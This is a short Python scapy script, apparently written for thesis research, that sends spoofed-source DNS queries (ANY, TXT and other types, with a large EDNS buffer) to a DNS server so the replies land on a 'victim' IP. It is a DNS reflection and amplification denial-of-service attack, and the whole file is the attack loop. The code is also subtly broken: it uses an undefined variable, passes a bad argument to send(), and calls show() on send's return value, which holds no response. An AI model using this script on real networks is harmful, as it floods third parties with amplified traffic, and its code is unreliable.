from scapy.all import *
import time

# IP of the victim
dnsSource = "x.x.x.x"
dnsDestination = "y.y.y.y" # IP of the DNS server
queryTypes = ["ANY", "A", "AAAA", "CNAME", "MX", "NS", "SOA", "TXT"]

queryName = "amaury.thesis.io"

packetNumber = 0
for queryType in queryTypes:

    start = time.time()
    while time.time() - start < 10:
        packetNumber += 1
        dnsQuery = IP(src=dnsSource, dst=dnsDestination) / UDP(sport=RandShort(), dport=53) / DNS(rd=1, ad=0, cd=1, qd=DNSQR(qname=domain, qtype=queryType), ar=DNSRROPT(rclass=8192))

        try:
            response = send(dnsQuery, verbose=0, timeout=1)
            response.show()
        except Exception as e:
            print(f"An exception occurred: {e}\n")
            
        